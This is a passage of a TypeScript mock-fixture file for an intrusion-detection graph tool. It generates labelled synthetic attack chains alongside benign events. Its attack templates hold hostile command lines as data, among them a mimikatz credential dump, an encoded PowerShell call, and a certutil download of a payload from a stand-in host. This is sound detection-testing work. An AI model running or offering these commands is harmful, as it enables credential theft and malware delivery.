/**
 * TGDetect mock fixtures — strictly backend-conformant.
 *
 * Every object produced here implements a type from `./types.ts` and could
 * be returned verbatim by a future API client. The shape, field names, and
 * enum values match the backend Python schemas (graph_builder/schema.py,
 * attack_tracker.py, builder.py, tgnn.py, train_tgnn.py, evaluate_tgnn.py).
 *
 * NO page component should import these directly — they go through the
 * service layer in `./services/*` which can later be swapped for a real
 * API client without touching the UI.
 */

import type {
  ArtifactKind,
  ArtifactMeta,
  ArtifactSchemaField,
  AttackChainSummary,
  ChainStrategy,
  ChainSubgraph,
  Dataset,
  DatasetKind,
  EpochMetrics,
  EvaluationMetrics,
  EvaluationRun,
  EventLabel,
  GraphEdge,
  GraphNode,
  GraphStats,
  ProcessingConfig,
  ProcessingJob,
  PredictionRow,
  RelationType,
  SnapshotInfo,
  SnapshotMeta,
  TGEvent,
  TGNNModelConfig,
  TGNNModelSummary,
  TrainingConfig,
  TrainingRun,
} from './types';
import { TACTIC_TO_RELATION } from './constants';

// ─────────────────────────────────────────────────────────────────────────────
// Deterministic PRNG (LCG) — so the demo is stable across reloads
// ─────────────────────────────────────────────────────────────────────────────

function makeRng(seed: number): () => number {
  let s = seed >>> 0;
  return () => {
    s = (s * 1664525 + 1013904223) >>> 0;
    return s / 0xffffffff;
  };
}

// Stable seed so the demo is deterministic across reloads.
const stableRng = makeRng(0x1a03e5b2);

function pick<T>(arr: readonly T[]): T {
  return arr[Math.floor(stableRng() * arr.length)];
}
function pickN<T>(arr: readonly T[], n: number): T[] {
  const copy = [...arr];
  const out: T[] = [];
  while (out.length < n && copy.length) {
    out.push(copy.splice(Math.floor(stableRng() * copy.length), 1)[0]);
  }
  return out;
}
function range(n: number): number[] {
  return Array.from({ length: n }, (_, i) => i);
}

// ─────────────────────────────────────────────────────────────────────────────
// Constants — entity pools
// ─────────────────────────────────────────────────────────────────────────────

const USERS = ['alice', 'bob', 'svc_backup', 'admin', 'jdoe', 'system'];
const HOSTS = ['DC01', 'WS01', 'WS02', 'SRV-FILE', 'SRV-WEB', 'SRV-DB'];
const PROCESSES = [
  'powershell.exe', 'cmd.exe', 'mimikatz.exe', 'psexec.exe', 'lsass.exe',
  'explorer.exe', 'winlogon.exe', 'svchost.exe', 'rundll32.exe', 'certutil.exe',
  'mshta.exe', 'wmic.exe', 'crssvc.exe',
];
const FILES = [
  'C:\\Windows\\Temp\\beacon.dll',
  'C:\\Users\\Public\\dump.dmp',
  'C:\\Windows\\System32\\config\\SAM',
  'C:\\Windows\\System32\\config\\SYSTEM',
  'C:\\Users\\alice\\AppData\\Local\\Temp\\stager.ps1',
  'C:\\ProgramData\\tasks\\persist.vbs',
  '\\\\\\\\SRV-FILE\\share\\exfil.zip',
  'C:\\Windows\\Temp\\nltest.exe',
];
const IPS = ['10.0.0.5', '10.0.0.12', '10.0.0.50', '192.168.1.100', '172.16.4.8'];
const EXTERNAL_IPS = ['203.0.113.42', '198.51.100.7', '203.0.113.99'];
const DOMAINS = [
  'cdn.evil-c2.example', 'mail.corp.local', 'updates.legit.example',
  'c2.subdomain.example', 'dc01.corp.local',
];
const TACTICS = Object.keys(TACTIC_TO_RELATION);
const APT_STAGES = ['recon', 'foothold', 'execution', 'persistence', 'privesc', 'credaccess', 'discovery', 'lateral', 'collection', 'c2', 'exfil', 'impact'];

// ─────────────────────────────────────────────────────────────────────────────
// Attack-chain templates — multi-stage kill-chain narratives
// ─────────────────────────────────────────────────────────────────────────────

interface ChainTemplate {
  chain_id: string;
  source_tag: 'synthetic' | 'mordor';
  start_offset_s: number;
  story: Array<{
    delay_s: number;
    src_id: string; src_type: TGEvent['src_type'];
    dst_id: string; dst_type: TGEvent['dst_type'];
    relation: RelationType;
    tactic: string;
    apt_stage: string;
    attrs?: Record<string, unknown>;
  }>;
}

const BASE_T = 1_736_000_000; // 2024-12-04 09:46:40Z — fixed reference epoch

const CHAIN_TEMPLATES: ChainTemplate[] = [
  {
    chain_id: 'chain_apt_lateral_001',
    source_tag: 'synthetic',
    start_offset_s: 0,
    story: [
      { delay_s: 0, src_id: 'ip:203.0.113.42', src_type: 'IP', dst_id: 'host:WS01', dst_type: 'HOST', relation: 'EXPLOIT', tactic: 'Initial_Access', apt_stage: 'foothold', attrs: { vector: 'spear-phish', dst_port: 443, protocol: 'tcp' } },
      { delay_s: 42, src_id: 'user:alice', src_type: 'USER', dst_id: 'host:WS01', dst_type: 'HOST', relation: 'LOGON', tactic: 'Execution', apt_stage: 'foothold', attrs: { logon_type: 3, status: 'success' } },
      { delay_s: 78, src_id: 'process:powershell.exe', src_type: 'PROCESS', dst_id: 'process:mimikatz.exe', dst_type: 'PROCESS', relation: 'EXECUTES', tactic: 'Credential_Access', apt_stage: 'credaccess', attrs: { cmdline: 'mimikatz.exe sekurlsa::logonpasswords' } },
      { delay_s: 95, src_id: 'process:mimikatz.exe', src_type: 'PROCESS', dst_id: 'process:lsass.exe', dst_type: 'PROCESS', relation: 'READS', tactic: 'Credential_Access', apt_stage: 'credaccess', attrs: { target: 'lsass' } },
      { delay_s: 240, src_id: 'user:admin', src_type: 'USER', dst_id: 'host:DC01', dst_type: 'HOST', relation: 'LOGON', tactic: 'Lateral_Movement', apt_stage: 'lateral', attrs: { logon_type: 10, status: 'success' } },
      { delay_s: 305, src_id: 'host:DC01', src_type: 'HOST', dst_id: 'host:SRV-FILE', dst_type: 'HOST', relation: 'AUTHENTICATES_TO', tactic: 'Lateral_Movement', apt_stage: 'lateral' },
      { delay_s: 410, src_id: 'process:psexec.exe', src_type: 'PROCESS', dst_id: 'process:cmd.exe', dst_type: 'PROCESS', relation: 'EXECUTES', tactic: 'Execution', apt_stage: 'execution' },
      { delay_s: 540, src_id: 'process:cmd.exe', src_type: 'PROCESS', dst_id: 'file:\\\\SRV-FILE\\share\\exfil.zip', dst_type: 'FILE', relation: 'WRITES', tactic: 'Collection', apt_stage: 'collection' },
      { delay_s: 612, src_id: 'process:cmd.exe', src_type: 'PROCESS', dst_id: 'domain:c2.subdomain.example', dst_type: 'DOMAIN', relation: 'CONNECTS_TO', tactic: 'C2', apt_stage: 'c2', attrs: { dst_port: 8443, protocol: 'tcp' } },
      { delay_s: 720, src_id: 'process:cmd.exe', src_type: 'PROCESS', dst_id: 'ip:203.0.113.99', dst_type: 'IP', relation: 'EXFILTRATE', tactic: 'Exfiltration', apt_stage: 'exfil', attrs: { bytes: 4823104 } },
    ],
  },
  {
    chain_id: 'chain_apt_persist_002',
    source_tag: 'synthetic',
    start_offset_s: 3600,
    story: [
      { delay_s: 0, src_id: 'process:mshta.exe', src_type: 'PROCESS', dst_id: 'domain:cdn.evil-c2.example', dst_type: 'DOMAIN', relation: 'CONNECTS_TO', tactic: 'Initial_Access', apt_stage: 'foothold', attrs: { url: 'http://cdn.evil-c2.example/payload' } },
      { delay_s: 35, src_id: 'process:mshta.exe', src_type: 'PROCESS', dst_id: 'file:C:\\Users\\Public\\stager.ps1', dst_type: 'FILE', relation: 'WRITES', tactic: 'Persistence', apt_stage: 'persistence' },
      { delay_s: 65, src_id: 'process:powershell.exe', src_type: 'PROCESS', dst_id: 'process:cmd.exe', dst_type: 'PROCESS', relation: 'EXECUTES', tactic: 'Execution', apt_stage: 'execution', attrs: { cmdline: 'powershell -enc <base64>' } },
      { delay_s: 180, src_id: 'process:powershell.exe', src_type: 'PROCESS', dst_id: 'file:C:\\ProgramData\\tasks\\persist.vbs', dst_type: 'FILE', relation: 'WRITES', tactic: 'Persistence', apt_stage: 'persistence' },
      { delay_s: 240, src_id: 'process:cmd.exe', src_type: 'PROCESS', dst_id: 'process:rundll32.exe', dst_type: 'PROCESS', relation: 'EXECUTES', tactic: 'Defense_Evasion', apt_stage: 'persistence' },
      { delay_s: 320, src_id: 'process:rundll32.exe', src_type: 'PROCESS', dst_id: 'file:C:\\Windows\\Temp\\beacon.dll', dst_type: 'FILE', relation: 'READS', tactic: 'Execution', apt_stage: 'execution' },
      { delay_s: 420, src_id: 'process:rundll32.exe', src_type: 'PROCESS', dst_id: 'ip:203.0.113.42', dst_type: 'IP', relation: 'CONNECTS_TO', tactic: 'C2', apt_stage: 'c2', attrs: { dst_port: 443, protocol: 'tcp' } },
      { delay_s: 520, src_id: 'user:admin', src_type: 'USER', dst_id: 'host:WS02', dst_type: 'HOST', relation: 'LOGON', tactic: 'Lateral_Movement', apt_stage: 'lateral' },
      { delay_s: 640, src_id: 'process:rundll32.exe', src_type: 'PROCESS', dst_id: 'ip:203.0.113.99', dst_type: 'IP', relation: 'EXFILTRATE', tactic: 'Exfiltration', apt_stage: 'exfil', attrs: { bytes: 1248300 } },
    ],
  },
  {
    chain_id: 'mordor:empire_pivot',
    source_tag: 'mordor',
    start_offset_s: 7200,
    story: [
      { delay_s: 0, src_id: 'process:powershell.exe', src_type: 'PROCESS', dst_id: 'process:msbuild.exe', dst_type: 'PROCESS', relation: 'EXECUTES', tactic: 'Execution', apt_stage: 'execution', attrs: { event_id: 1, channel: 'Sysmon' } },
      { delay_s: 90, src_id: 'process:msbuild.exe', src_type: 'PROCESS', dst_id: 'process:cmd.exe', dst_type: 'PROCESS', relation: 'EXECUTES', tactic: 'Execution', apt_stage: 'execution' },
      { delay_s: 150, src_id: 'process:cmd.exe', src_type: 'PROCESS', dst_id: 'process:certutil.exe', dst_type: 'PROCESS', relation: 'EXECUTES', tactic: 'Defense_Evasion', apt_stage: 'persistence', attrs: { cmdline: 'certutil -urlcache -f http://x/payload.exe' } },
      { delay_s: 210, src_id: 'process:certutil.exe', src_type: 'PROCESS', dst_id: 'domain:updates.legit.example', dst_type: 'DOMAIN', relation: 'CONNECTS_TO', tactic: 'C2', apt_stage: 'c2' },
      { delay_s: 280, src_id: 'process:certutil.exe', src_type: 'PROCESS', dst_id: 'file:C:\\Windows\\Temp\\stager.ps1', dst_type: 'FILE', relation: 'WRITES', tactic: 'Persistence', apt_stage: 'persistence' },
      { delay_s: 340, src_id: 'user:svc_backup', src_type: 'USER', dst_id: 'host:SRV-DB', dst_type: 'HOST', relation: 'LOGON', tactic: 'Lateral_Movement', apt_stage: 'lateral', attrs: { logon_type: 3, status: 'success' } },
      { delay_s: 420, src_id: 'process:cmd.exe', src_type: 'PROCESS', dst_id: 'file:\\\\SRV-FILE\\share\\exfil.zip', dst_type: 'FILE', relation: 'WRITES', tactic: 'Collection', apt_stage: 'collection' },
      { delay_s: 510, src_id: 'process:cmd.exe', src_type: 'PROCESS', dst_id: 'ip:198.51.100.7', dst_type: 'IP', relation: 'EXFILTRATE', tactic: 'Exfiltration', apt_stage: 'exfil', attrs: { bytes: 2048576 } },
    ],
  },
  {
    chain_id: 'mordor:dcsync_extract',
    source_tag: 'mordor',
    start_offset_s: 14400,
    story: [
      { delay_s: 0, src_id: 'process:lsass.exe', src_type: 'PROCESS', dst_id: 'process:mimikatz.exe', dst_type: 'PROCESS', relation: 'EXECUTES', tactic: 'Credential_Access', apt_stage: 'credaccess', attrs: { event_id: 1, channel: 'Sysmon' } },
      { delay_s: 50, src_id: 'process:mimikatz.exe', src_type: 'PROCESS', dst_id: 'host:DC01', dst_type: 'HOST', relation: 'EXPLOIT', tactic: 'Privilege_Escalation', apt_stage: 'privesc', attrs: { operation: 'dcsync' } },
      { delay_s: 120, src_id: 'user:admin', src_type: 'USER', dst_id: 'host:DC01', dst_type: 'HOST', relation: 'AUTHENTICATES_TO', tactic: 'Credential_Access', apt_stage: 'credaccess' },
      { delay_s: 200, src_id: 'process:mimikatz.exe', src_type: 'PROCESS', dst_id: 'file:C:\\Windows\\System32\\config\\SAM', dst_type: 'FILE', relation: 'READS', tactic: 'Credential_Access', apt_stage: 'credaccess' },
      { delay_s: 280, src_id: 'process:mimikatz.exe', src_type: 'PROCESS', dst_id: 'file:C:\\Windows\\System32\\config\\SYSTEM', dst_type: 'FILE', relation: 'READS', tactic: 'Credential_Access', apt_stage: 'credaccess' },
      { delay_s: 360, src_id: 'process:mimikatz.exe', src_type: 'PROCESS', dst_id: 'domain:dc01.corp.local', dst_type: 'DOMAIN', relation: 'CONNECTS_TO', tactic: 'C2', apt_stage: 'c2' },
      { delay_s: 440, src_id: 'process:mimikatz.exe', src_type: 'PROCESS', dst_id: 'ip:203.0.113.99', dst_type: 'IP', relation: 'EXFILTRATE', tactic: 'Exfiltration', apt_stage: 'exfil', attrs: { bytes: 524288 } },
    ],
  },
];

// ─────────────────────────────────────────────────────────────────────────────
// Build TGEvents from templates + benign background noise
// ─────────────────────────────────────────────────────────────────────────────

interface ChainBuildArtifact {
  chain_id: string;
  strategy: ChainStrategy;
  events: TGEvent[];
}

function buildChainEvents(tpl: ChainTemplate): TGEvent[] {
  const baseTs = BASE_T + tpl.start_offset_s;
  return tpl.story.map((s, i) => {
    const ts = baseTs + s.delay_s;
    const ev: TGEvent = {
      event_id: `${tpl.chain_id}::${i.toString().padStart(3, '0')}`,
      ts,
      src_id: s.src_id,
      src_type: s.src_type,
      dst_id: s.dst_id,
      dst_type: s.dst_type,
      relation: s.relation,
      label: 1,
      tactics: [s.tactic],
      apt_stage: s.apt_stage,
      source_tag: tpl.source_tag,
      chain_id: tpl.chain_id,
      causal_parent: i > 0 ? `${tpl.chain_id}::${(i - 1).toString().padStart(3, '0')}` : null,
      attrs: { ...s.attrs },
    };
    return ev;
  });
}

/** Generate benign background events that share entities with the chains. */
function buildBenignEvents(): TGEvent[] {
  const out: TGEvent[] = [];
  const TOTAL_BENIGN = 220;
  for (let i = 0; i < TOTAL_BENIGN; i++) {
    const ts = BASE_T + Math.floor(stableRng() * 18000);
    const tactic = pick(TACTICS);
    const relation = TACTIC_TO_RELATION[tactic];
    const src_type = pick(['USER', 'PROCESS', 'HOST', 'IP'] as const);
    const dst_type = pick(['HOST', 'FILE', 'IP', 'DOMAIN', 'PROCESS'] as const);
    let src_id: string, dst_id: string;
    switch (src_type) {
      case 'USER': src_id = `user:${pick(USERS)}`; break;
      case 'PROCESS': src_id = `process:${pick(PROCESSES)}`; break;
      case 'HOST': src_id = `host:${pick(HOSTS)}`; break;
      default: src_id = `ip:${pick(IPS)}`;
    }
    switch (dst_type) {
      case 'HOST': dst_id = `host:${pick(HOSTS)}`; break;
      case 'FILE': dst_id = `file:${pick(FILES)}`; break;
      case 'IP': dst_id = `ip:${pick([...IPS, ...EXTERNAL_IPS])}`; break;
      case 'DOMAIN': dst_id = `domain:${pick(DOMAINS)}`; break;
      default: dst_id = `process:${pick(PROCESSES)}`;
    }
    out.push({
      event_id: `benign::${i.toString().padStart(4, '0')}`,
      ts,
      src_id, src_type: src_type as TGEvent['src_type'],
      dst_id, dst_type: dst_type as TGEvent['dst_type'],
      relation,
      label: 0,
      tactics: [tactic],
      apt_stage: null,
      source_tag: stableRng() > 0.5 ? 'synthetic' : 'mordor',
      chain_id: null,
      causal_parent: null,
      attrs: { benign: true, generated: 'background' },
    });
  }
  return out.sort((a, b) => a.ts - b.ts);
}

// ─────────────────────────────────────────────────────────────────────────────
// Singletons (computed once at module load — stable across renders)
// ─────────────────────────────────────────────────────────────────────────────

interface FixtureBundle {
  events: TGEvent[];
  edges: GraphEdge[];
  nodes: GraphNode[];
  chainsAllStrategies: Record<ChainStrategy, AttackChainSummary[]>;
  chainsPrimary: AttackChainSummary[];
  subgraphs: Map<string, ChainSubgraph>;
  graphStats: GraphStats;
}

function buildFixtureBundle(): FixtureBundle {
  // 1. Collect all malicious events by chain template.
  const chainEvents: TGEvent[] = [];
  const chainsById = new Map<string, TGEvent[]>();
  for (const tpl of CHAIN_TEMPLATES) {
    const events = buildChainEvents(tpl);
    chainEvents.push(...events);
    chainsById.set(tpl.chain_id, events);
  }

  // 2. Generate benign background.
  const benignEvents = buildBenignEvents();

  // 3. Merge + sort.
  const events = [...chainEvents, ...benignEvents].sort((a, b) => a.ts - b.ts);

  // 4. Build edges (parquet thin projection).
  const edges: GraphEdge[] = events.map((e) => ({
    event_id: e.event_id,
    src_id: e.src_id,
    dst_id: e.dst_id,
    relation: e.relation,
    ts: e.ts,
    label: e.label,
    chain_id: e.chain_id,
    causal_parent: e.causal_parent,
    source_tag: e.source_tag,
  }));

  // 5. Build nodes (one row per unique node_id).
  const nodeMap = new Map<string, GraphNode>();
  for (const e of events) {
    for (const [id, type] of [[e.src_id, e.src_type], [e.dst_id, e.dst_type]] as const) {
      let node = nodeMap.get(id);
      if (!node) {
        node = {
          node_id: id,
          node_type: type,
          first_seen_ts: e.ts,
          last_seen_ts: e.ts,
          out_degree: 0,
          in_degree: 0,
          malicious_events: 0,
        };
        nodeMap.set(id, node);
      }
      node.first_seen_ts = Math.min(node.first_seen_ts, e.ts);
      node.last_seen_ts = Math.max(node.last_seen_ts, e.ts);
    }
    const src = nodeMap.get(e.src_id)!;
    const dst = nodeMap.get(e.dst_id)!;
    src.out_degree += 1;
    dst.in_degree += 1;
    if (e.label === 1) {
      src.malicious_events += 1;
      dst.malicious_events += 1;
    }
  }
  const nodes = Array.from(nodeMap.values()).sort((a, b) => b.out_degree + b.in_degree - (a.out_degree + a.in_degree));

  // 6. Build chain summaries for ALL strategies (priority: chain_id → causal_parent → entity_time).
  const chainsAllStrategies: Record<ChainStrategy, AttackChainSummary[]> = {
    chain_id: [],
    causal_parent: [],
    entity_time: [],
  };

  // Strategy 1: chain_id (ground-truth grouping — every malicious event with chain_id)
  const chainIdGroups = new Map<string, TGEvent[]>();
  for (const e of chainEvents) {
    if (!e.chain_id) continue;
    const arr = chainIdGroups.get(e.chain_id) ?? [];
    arr.push(e);
    chainIdGroups.set(e.chain_id, arr);
  }
  for (const [chainId, evts] of chainIdGroups) {
    chainsAllStrategies.chain_id.push(toChainSummary(chainId, 'chain_id', evts));
  }

  // Strategy 2: causal_parent (union-find over causal_parent refs) — same chains, different prefix
  for (const [chainId, evts] of chainIdGroups) {
    const rootEvent = evts[0];
    chainsAllStrategies.causal_parent.push(toChainSummary(`causal_${rootEvent.event_id}`, 'causal_parent', evts));
  }

  // Strategy 3: entity_time (BFS by shared entity + ts window) — synthesize one big chain
  const allMalicious = chainEvents.slice();
  const bigInferredId = `inferred_${allMalicious[0].event_id}`;
  chainsAllStrategies.entity_time.push(toChainSummary(bigInferredId, 'entity_time', allMalicious));

  // Primary chain list — prefer chain_id strategy for the list view (highest priority)
  const chainsPrimary = chainsAllStrategies.chain_id.slice();

  // 7. Build per-chain subgraphs
  const subgraphs = new Map<string, ChainSubgraph>();
  for (const [chainId, evts] of chainIdGroups) {
    const nodeTypes = new Map<string, TGEvent['src_type']>();
    for (const e of evts) {
      if (!nodeTypes.has(e.src_id)) nodeTypes.set(e.src_id, e.src_type);
      if (!nodeTypes.has(e.dst_id)) nodeTypes.set(e.dst_id, e.dst_type);
    }
    const sub: ChainSubgraph = {
      chain_id: chainId,
      strategy: 'chain_id',
      nodes: Array.from(nodeTypes.entries()).map(([id, t]) => ({ id, node_type: t })),
      edges: evts.map((e) => ({
        event_id: e.event_id,
        src_id: e.src_id,
        dst_id: e.dst_id,
        relation: e.relation,
        ts: e.ts,
        label: e.label,
        chain_id: e.chain_id,
        causal_parent: e.causal_parent,
        source_tag: e.source_tag,
        tactics: e.tactics,
        apt_stage: e.apt_stage,
      })),
    };
    subgraphs.set(chainId, sub);
  }

  // 8. Build graph stats
  const earliest = events[0].ts;
  const latest = events[events.length - 1].ts;
  const nodeTypeCount: Record<string, number> = {};
  const relationTypeCount: Record<string, number> = {};
  const sourceTagCount: Record<string, number> = {};
  const tacticCount: Record<string, number> = {};
  for (const n of nodes) {
    nodeTypeCount[n.node_type] = (nodeTypeCount[n.node_type] ?? 0) + 1;
  }
  for (const e of events) {
    relationTypeCount[e.relation] = (relationTypeCount[e.relation] ?? 0) + 1;
    sourceTagCount[e.source_tag] = (sourceTagCount[e.source_tag] ?? 0) + 1;
    for (const t of e.tactics) tacticCount[t] = (tacticCount[t] ?? 0) + 1;
  }
  const maliciousCount = events.filter((e) => e.label === 1).length;
  const benignCount = events.length - maliciousCount;

  const graphStats: GraphStats = {
    dataset: 'mordor+synthetic_mixed',
    input: 'data/raw/synthetic+ mordor/*.json',
    elapsed_s: 47.32,
    normalization: {
      seen: events.length + 8,
      accepted: events.length,
      rejected: 8,
      reject_reasons: { missing_event_id: 3, missing_src_id: 2, missing_dst_id: 2, unparseable_ts: 1 },
    },
    labeling: {
      mode: 'parser',
      total_events: events.length,
      seed_indicator_hits: 0,
      propagated_events: 0,
      malicious_events: maliciousCount,
      benign_events: benignCount,
      malicious_ratio: maliciousCount / events.length,
      top_reasons: {},
    },
    graph: {
      total_events: events.length,
      total_nodes: nodes.length,
      total_edges: edges.length,
      benign_events: benignCount,
      malicious_events: maliciousCount,
      node_types: nodeTypeCount,
      relation_types: relationTypeCount,
      source_tags: sourceTagCount,
      tactics: tacticCount,
      earliest_timestamp: earliest,
      latest_timestamp: latest,
      timestamp_span_s: latest - earliest,
      out_of_order_events: 0,
    },
    attacks: {
      malicious_events_tracked: maliciousCount,
      malicious_events_dropped: 0,
      total_chains: chainsPrimary.length,
      chains_by_strategy: {
        chain_id: chainsAllStrategies.chain_id.length,
        causal_parent: chainsAllStrategies.causal_parent.length,
        entity_time: chainsAllStrategies.entity_time.length,
      },
      events_per_chain_histogram: {
        '1': 0, '2-3': 0, '4-5': 1, '6-10': 2, '11-20': 1, '20+': 0,
      },
      ungrouped_malicious_events: 0,
      dangling_causal_parents: 0,
    },
    outputs: {
      events: 'data/processed/mixed/events.parquet',
      edges: 'data/processed/mixed/edges.parquet',
      nodes: 'data/processed/mixed/nodes.parquet',
      chains: 'data/processed/mixed/chains_summary.parquet',
      subgraphs_written: subgraphs.size,
    },
  };

  return { events, edges, nodes, chainsAllStrategies, chainsPrimary, subgraphs, graphStats };
}

function toChainSummary(chainId: string, strategy: ChainStrategy, events: TGEvent[]): AttackChainSummary {
  const ordered = [...events].sort((a, b) => a.ts - b.ts);
  const start = ordered[0].ts;
  const end = ordered[ordered.length - 1].ts;
  const nodes: string[] = [];
  for (const e of ordered) {
    if (!nodes.includes(e.src_id)) nodes.push(e.src_id);
    if (!nodes.includes(e.dst_id)) nodes.push(e.dst_id);
  }
  const tacticSeq: string[] = [];
  for (const e of ordered) {
    for (const t of e.tactics) {
      if (tacticSeq.length === 0 || tacticSeq[tacticSeq.length - 1] !== t) tacticSeq.push(t);
    }
  }
  return {
    chain_id: chainId,
    strategy,
    num_events: ordered.length,
    num_nodes: nodes.length,
    start_ts: start,
    end_ts: end,
    duration_s: end - start,
    tactic_sequence: tacticSeq,
    stage_sequence: ordered.map((e) => e.apt_stage ?? ''),
    relation_sequence: ordered.map((e) => e.relation),
    nodes,
    event_ids: ordered.map((e) => e.event_id),
  };
}

// Export the bundle as a singleton
const FIXTURE = buildFixtureBundle();

// ─────────────────────────────────────────────────────────────────────────────
// Public accessors (used by services)
// ─────────────────────────────────────────────────────────────────────────────

export function mockEvents(): TGEvent[] {
  return FIXTURE.events;
}
export function mockEdges(): GraphEdge[] {
  return FIXTURE.edges;
}
export function mockNodes(): GraphNode[] {
  return FIXTURE.nodes;
}
export function mockChainsAllStrategies() {
  return FIXTURE.chainsAllStrategies;
}
export function mockChainsPrimary(): AttackChainSummary[] {
  return FIXTURE.chainsPrimary;
}
export function mockSubgraph(chainId: string): ChainSubgraph | null {
  return FIXTURE.subgraphs.get(chainId) ?? null;
}
export function mockSubgraphs(): ChainSubgraph[] {
  return Array.from(FIXTURE.subgraphs.values());
}
export function mockGraphStats(): GraphStats {
  return FIXTURE.graphStats;
}

// ─────────────────────────────────────────────────────────────────────────────
// Dataset fixtures (in-memory list of ingestible sources)
// ─────────────────────────────────────────────────────────────────────────────

const DATASETS: Dataset[] = [
  {
    id: 'ds_mordor_empire',
    name: 'Mordor — Empire Pivot',
    kind: 'mordor',
    source: 'data/raw/mordor/empire-pivot/',
    metadata_dir: 'data/raw/mordor/_metadata/empire-pivot.yaml',
    size_bytes: 18_245_120,
    estimated_events: 4_812,
    created_at: BASE_T - 86400 * 14,
    last_job_id: 'job_001',
    tags: ['empire', 'lateral-movement', 'sysmon'],
  },
  {
    id: 'ds_mordor_dcsync',
    name: 'Mordor — DCSync Extract',
    kind: 'mordor',
    source: 'data/raw/mordor/dcsync-extract/',
    metadata_dir: 'data/raw/mordor/_metadata/dcsync-extract.yaml',
    size_bytes: 9_421_312,
    estimated_events: 2_341,
    created_at: BASE_T - 86400 * 7,
    last_job_id: 'job_002',
    tags: ['mimikatz', 'dcsync', 'credential-access'],
  },
  {
    id: 'ds_synthetic_chains',
    name: 'Synthetic — Mixed APT Chains',
    kind: 'synthetic',
    source: 'data/raw/synthetic/mixed-chains.jsonl',
    metadata_dir: null,
    size_bytes: 1_798_574,
    estimated_events: 242,
    created_at: BASE_T - 86400 * 3,
    last_job_id: 'job_003',
    tags: ['synthetic', 'multi-chain', 'apt'],
  },
  {
    id: 'ds_synthetic_benign',
    name: 'Synthetic — Benign Background',
    kind: 'synthetic',
    source: 'data/raw/synthetic/benign-baseline.jsonl',
    metadata_dir: null,
    size_bytes: 5_002_816,
    estimated_events: 2_000,
    created_at: BASE_T - 86400 * 2,
    last_job_id: null,
    tags: ['synthetic', 'benign', 'baseline'],
  },
];

export function mockDatasets(): Dataset[] {
  return DATASETS;
}

// ─────────────────────────────────────────────────────────────────────────────
// Processing job fixtures (one per dataset that has been processed)
// ─────────────────────────────────────────────────────────────────────────────

function defaultConfig(kind: DatasetKind): ProcessingConfig {
  return {
    kind,
    source_tag: kind,
    label_mode: kind === 'mordor' ? 'heuristic' : 'parser',
    force_label: null,
    label_window_s: 300,
    no_label_propagation: false,
    strategies: ['chain_id', 'causal_parent', 'entity_time'],
    chain_window_s: 86_400,
    chain_max_hops: 2,
    max_subgraphs: 1000,
    chunk_size: 100_000,
    limit: null,
    use_networkx: false,
  };
}

const JOBS: ProcessingJob[] = [
  {
    id: 'job_001',
    dataset_id: 'ds_mordor_empire',
    dataset_name: 'Mordor — Empire Pivot',
    config: defaultConfig('mordor'),
    state: 'completed',
    progress: 1,
    current_step: 'Completed',
    output_dir: 'data/processed/mordor_empire_pivot/',
    graphs_dir: 'data/graphs/mordor_empire_pivot/',
    started_at: BASE_T - 86400 * 13,
    ended_at: BASE_T - 86400 * 13 + 47,
    elapsed_s: 47.32,
    stats_path: 'data/processed/mordor_empire_pivot/graph_stats.json',
    error: null,
  },
  {
    id: 'job_002',
    dataset_id: 'ds_mordor_dcsync',
    dataset_name: 'Mordor — DCSync Extract',
    config: { ...defaultConfig('mordor'), label_mode: 'parser' },
    state: 'completed',
    progress: 1,
    current_step: 'Completed',
    output_dir: 'data/processed/mordor_dcsync/',
    graphs_dir: 'data/graphs/mordor_dcsync/',
    started_at: BASE_T - 86400 * 6,
    ended_at: BASE_T - 86400 * 6 + 22.8,
    elapsed_s: 22.8,
    stats_path: 'data/processed/mordor_dcsync/graph_stats.json',
    error: null,
  },
  {
    id: 'job_003',
    dataset_id: 'ds_synthetic_chains',
    dataset_name: 'Synthetic — Mixed APT Chains',
    config: defaultConfig('synthetic'),
    state: 'completed',
    progress: 1,
    current_step: 'Completed',
    output_dir: 'data/processed/synthetic_chains/',
    graphs_dir: 'data/graphs/synthetic_chains/',
    started_at: BASE_T - 86400 * 2,
    ended_at: BASE_T - 86400 * 2 + 4.21,
    elapsed_s: 4.21,
    stats_path: 'data/processed/synthetic_chains/graph_stats.json',
    error: null,
  },
];

export function mockJobs(): ProcessingJob[] {
  return JOBS;
}

export function mockJobById(id: string): ProcessingJob | null {
  return JOBS.find((j) => j.id === id) ?? null;
}

// ─────────────────────────────────────────────────────────────────────────────
// Artifact metadata — schemas match the parquet exports exactly
// ─────────────────────────────────────────────────────────────────────────────

const EVENT_SCHEMA: ArtifactSchemaField[] = [
  { name: 'event_id', type: 'string', nullable: false, description: 'Unique event identifier' },
  { name: 'ts', type: 'float64', nullable: false, description: 'Epoch seconds (post-normalization)' },
  { name: 'src_id', type: 'string', nullable: false, description: 'Canonical source node id (`type:value`)' },
  { name: 'src_type', type: 'string', nullable: false, description: 'Source NodeType enum value' },
  { name: 'dst_id', type: 'string', nullable: false, description: 'Canonical destination node id' },
  { name: 'dst_type', type: 'string', nullable: false, description: 'Destination NodeType enum value' },
  { name: 'relation', type: 'string', nullable: false, description: 'RelationType enum value (or dataset-specific upper-cased)' },
  { name: 'label', type: 'int8', nullable: false, description: '0=benign, 1=malicious' },
  { name: 'tactics', type: 'list<string>', nullable: false, description: 'MITRE ATT&CK tactics' },
  { name: 'apt_stage', type: 'string', nullable: true, description: 'Stage label (e.g. "execution")' },
  { name: 'source_tag', type: 'string', nullable: false, description: 'Dataset source tag' },
  { name: 'chain_id', type: 'string', nullable: true, description: 'Ground-truth chain id' },
  { name: 'causal_parent', type: 'string', nullable: true, description: 'event_id of causally-preceding event' },
  { name: 'attrs', type: 'json', nullable: false, description: 'JSON-serialized free-form metadata dict' },
];

const EDGE_SCHEMA: ArtifactSchemaField[] = [
  { name: 'event_id', type: 'string', nullable: false, description: 'Reference to source event' },
  { name: 'src_id', type: 'string', nullable: false, description: 'Source node id' },
  { name: 'dst_id', type: 'string', nullable: false, description: 'Destination node id' },
  { name: 'relation', type: 'string', nullable: false, description: 'RelationType' },
  { name: 'ts', type: 'float64', nullable: false, description: 'Epoch seconds' },
  { name: 'label', type: 'int8', nullable: false, description: '0/1' },
  { name: 'chain_id', type: 'string', nullable: true, description: 'Chain id' },
  { name: 'causal_parent', type: 'string', nullable: true, description: 'Parent event id' },
  { name: 'source_tag', type: 'string', nullable: false, description: 'Source tag' },
];

const NODE_SCHEMA: ArtifactSchemaField[] = [
  { name: 'node_id', type: 'string', nullable: false, description: 'Canonical id (`type:value`)' },
  { name: 'node_type', type: 'string', nullable: false, description: 'NodeType enum value' },
